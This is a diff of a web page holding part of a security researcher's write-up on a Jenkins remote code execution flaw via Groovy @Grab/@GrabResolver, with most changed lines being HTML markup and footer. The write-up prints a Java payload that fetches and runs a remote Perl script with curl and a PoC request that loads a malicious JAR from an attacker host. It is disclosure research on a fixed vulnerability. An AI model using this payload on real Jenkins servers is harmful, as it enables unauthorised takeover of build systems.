-<p>Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official <a href="http://groovy-lang.org/metaprogramming.html">Meta-Programming manual</a> to find some exploitation ways. In the section 2.1.9, we found the <code class="highlighter-rouge">@groovy.transform.ASTTest</code> annotation. Here is its description:</p>
+<p>Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official <a href="http://groovy-lang.org/metaprogramming.html">Meta-Programming manual</a> to find some exploitation ways. In the section 2.1.9, we found the <code class="language-plaintext highlighter-rouge">@groovy.transform.ASTTest</code> annotation. Here is its description:</p>
 
 <blockquote>
-  <p><code class="highlighter-rouge">@ASTTest</code> is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and <strong>perform assertions on the AST</strong> rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. <code class="highlighter-rouge">@ASTTest</code> can be placed on any annotable node and requires two parameters:</p>
+  <p><code class="language-plaintext highlighter-rouge">@ASTTest</code> is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and <strong>perform assertions on the AST</strong> rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. <code class="language-plaintext highlighter-rouge">@ASTTest</code> can be placed on any annotable node and requires two parameters:</p>
 </blockquote>
 
 <p>What! <strong>perform assertions on the AST</strong>? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:</p>
@@ -270,7 +652,7 @@ def x
 
 <p>What the hell!!! What’s wrong with that?</p>
 
-<p>With a little bit digging, we found the root cause. This is caused by the <a href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error <code class="highlighter-rouge">unsable to resolve class</code> occurs!</p>
+<p>With a little bit digging, we found the root cause. This is caused by the <a href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error <code class="language-plaintext highlighter-rouge">unsable to resolve class</code> occurs!</p>
 
 <p>How to fix this problem? It’s simple! Just go to <a href="http://jenkins.local/pluginManager/">Jenkins Plugin Manager</a> and remove the <a href="https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin">Pipeline Shared Groovy Libraries Plugin</a>! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!</p>
 
@@ -279,7 +661,7 @@ def x
 <h3 id="second-attempt">Second Attempt</h3>
 <hr />
 
-<p>We continued reading the <a href="http://groovy-lang.org/metaprogramming.html">Groovy Meta-Programming manual</a> and found another interesting annotation - <code class="highlighter-rouge">@Grab</code>. There is no detailed information about <code class="highlighter-rouge">@Grab</code> on the manual. However, we found another article - <a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html">Dependency management with Grape</a> on search engine!</p>
+<p>We continued reading the <a href="http://groovy-lang.org/metaprogramming.html">Groovy Meta-Programming manual</a> and found another interesting annotation - <code class="language-plaintext highlighter-rouge">@Grab</code>. There is no detailed information about <code class="language-plaintext highlighter-rouge">@Grab</code> on the manual. However, we found another article - <a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html">Dependency management with Grape</a> on search engine!</p>
 
 <p>Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:</p>
 
@@ -287,16 +669,16 @@ def x
 <span class="kn">import</span> <span class="nn">org.springframework.jdbc.core.JdbcTemplate</span>
 </code></pre></div></div>
 
-<p>By using <code class="highlighter-rouge">@Grab</code> annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the <a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">PoC</a> proveded by <a href="https://github.com/adamyordan">@adamyordan</a> to execute arbitrary commands!</p>
+<p>By using <code class="language-plaintext highlighter-rouge">@Grab</code> annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the <a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">PoC</a> proveded by <a href="https://github.com/adamyordan">@adamyordan</a> to execute arbitrary commands!</p>
 
-<p>However, without a valid credential and <code class="highlighter-rouge">execute()</code> method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about <code class="highlighter-rouge">@Grab</code>, we found another interesting annotation - <code class="highlighter-rouge">@GrabResolver</code>:</p>
+<p>However, without a valid credential and <code class="language-plaintext highlighter-rouge">execute()</code> method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about <code class="language-plaintext highlighter-rouge">@Grab</code>, we found another interesting annotation - <code class="language-plaintext highlighter-rouge">@GrabResolver</code>:</p>
 
 <div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@GrabResolver</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s1">'restlet'</span><span class="o">,</span> <span class="n">root</span><span class="o">=</span><span class="s1">'http://maven.restlet.org/'</span><span class="o">)</span>
 <span class="nd">@Grab</span><span class="o">(</span><span class="n">group</span><span class="o">=</span><span class="s1">'org.restlet'</span><span class="o">,</span> <span class="n">module</span><span class="o">=</span><span class="s1">'org.restlet'</span><span class="o">,</span> <span class="n">version</span><span class="o">=</span><span class="s1">'1.1.6'</span><span class="o">)</span>
 <span class="kn">import</span> <span class="nn">org.restlet</span>
 </code></pre></div></div>
 
-<p>If you are smart enough, you would like to change the <code class="highlighter-rouge">root</code> parameter to a malicious website! Let’s try this in local environment:</p>
+<p>If you are smart enough, you would like to change the <code class="language-plaintext highlighter-rouge">root</code> parameter to a malicious website! Let’s try this in local environment:</p>
 
 <div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="s1">'''
 @GrabResolver(name='restlet', root='http://orange.tw/')
@@ -337,7 +719,7 @@ import org.restlet
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p>JAR file is just a subset of ZIP format. In the <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>, Grape registers servies if there are some specified entry points. Among them, the <code class="highlighter-rouge">Runner</code> interests me. By looking into the implementation of <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335">processRunners(…)</a>, we found this:</p>
+<p>JAR file is just a subset of ZIP format. In the <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312">processOtherServices(…)</a>, Grape registers servies if there are some specified entry points. Among them, the <code class="language-plaintext highlighter-rouge">Runner</code> interests me. By looking into the implementation of <a href="https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335">processRunners(…)</a>, we found this:</p>
 
 <div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">processRunners</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">is</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">)</span> <span class="o">{</span>
     <span class="n">is</span><span class="o">.</span><span class="na">text</span><span class="o">.</span><span class="na">readLines</span><span class="o">().</span><span class="na">each</span> <span class="o">{</span>
@@ -346,17 +728,17 @@ import org.restlet
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p>Here we see the <code class="highlighter-rouge">newInstance()</code>. Does it mean that we can call <code class="highlighter-rouge">Constructor</code> on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file <code class="highlighter-rouge">META-INF/services/org.codehaus.groovy.plugins.Runners</code> and we can invoke the <code class="highlighter-rouge">Constructor</code> and execute arbitrary code!</p>
+<p>Here we see the <code class="language-plaintext highlighter-rouge">newInstance()</code>. Does it mean that we can call <code class="language-plaintext highlighter-rouge">Constructor</code> on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file <code class="language-plaintext highlighter-rouge">META-INF/services/org.codehaus.groovy.plugins.Runners</code> and we can invoke the <code class="language-plaintext highlighter-rouge">Constructor</code> and execute arbitrary code!</p>
 
 <p>Here is the full exploit:</p>
 
 <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Orange</span> <span class="o">{</span>
     <span class="kd">public</span> <span class="nf">Orange</span><span class="o">(){</span>
         <span class="k">try</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"curl orange.tw/bc.pl | perl -"</span><span class="o">;</span>
-            <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">payload</span><span class="o">};</span>
+            <span class="nc">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"curl orange.tw/bc.pl | perl -"</span><span class="o">;</span>
+            <span class="nc">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">payload</span><span class="o">};</span>
             <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
 
     <span class="o">}</span>
 <span class="o">}</span>
@@ -381,7 +763,7 @@ Date: Sat, 02 Feb 2019 11:10:55 GMT
 </code></pre></div></div>
 
 <p>PoC:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
 ?value=
 @GrabConfig(disableChecksums=true)%0a
 @GrabResolver(name='orange.tw', root='http://[your_host]/')%0a
@@ -400,120 +782,126 @@ import Orange;
 
 <p>With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(<a href="https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin">Script Security Plugin</a>) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!</p>
 
-<p>Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points <code class="highlighter-rouge">doCheckScriptCompile(...)</code> and <code class="highlighter-rouge">toJson(...)</code> I reported, after the vulnerability has been fixed, <a href="https://twitter.com/0ang3el">Mikhail Egorov</a> also found another <a href="https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292">entry point</a> quickly to trigger this vulnerability!</p>
+<p>Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points <code class="language-plaintext highlighter-rouge">doCheckScriptCompile(...)</code> and <code class="language-plaintext highlighter-rouge">toJson(...)</code> I reported, after the vulnerability has been fixed, <a href="https://twitter.com/0ang3el">Mikhail Egorov</a> also found another <a href="https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292">entry point</a> quickly to trigger this vulnerability!</p>
 
 <p>Apart from that, this vulnerability can also be chained with my previous exploit on <a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">Hacking Jenkins Part 1</a> to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P</p>
 
 <p>Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)</p>
 
 
-              </article>
-              <p class="sns-widgets">
-                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
-              </p>
-          
-              <div class="heading--side-lined">
-                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="blog-author-name">Orange Tsai</a> 
-              </div>
-              <p class="blog-author-info">
-                I am Orange : )
-              </p>
-          
-              <div class="heading--side-lined">
-                Comments
-              </div>
-              <div class="blog-comments">
-                
-
-
-  <div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_developer = 1;
-    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
-    
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-
-
-              </div>
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/orange">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/orange">
+                            <h3>Orange Tsai</h3>
+                        </a>
+                        <span>Principal Security Researcher</span>
+                        <p>
+                            I am Orange : )
+                        </p>
+                    </div>
+                </div>
             </div>
-          </div>
+        </section>
+        
 
-
-
-
-
-
-</main>
-      <div class="container--wrapper">
-
-
-        <div class="contact-section container">
-          <h2 class="contact-section__title">
-            Put your defenses to the test with authentic attacks
-          </h2>
-          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
-        </div>
-
-        <footer class="main-footer">
-          <div class="main-footer__about">
-            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
-          </div>
-          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
-                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
-                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
-          </div>
-          <address class="main-footer__address">
-            <ul class="list--unstyled">
-              <li>
-                13F., No. 32, Sec. 3, Bade Rd., Songshan Dist., Taipei City 105608, Taiwan
-              </li>
-              <li>
-                contact@devco.re
-              </li>
-              <li>
-                +886-2-2577-0925
-              </li>
-            </ul>
-          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2023 DEVCORE</small>
-        </footer>
-      </div>
     </div>
-    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>
 
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
 
-  <script type="text/javascript">
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-30830800-1']);
-  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
 
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
-</script>
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
 
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
 
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
 
+    <div class="copyright">
+        <div class="info">
+            <span>© 2023 DEVCORE <b class="line-block">All right reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
 
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
-
-  </body>
+</div>
+    </footer>
+</body>
 </html>
+
+
+
+
+
+
 
 
 
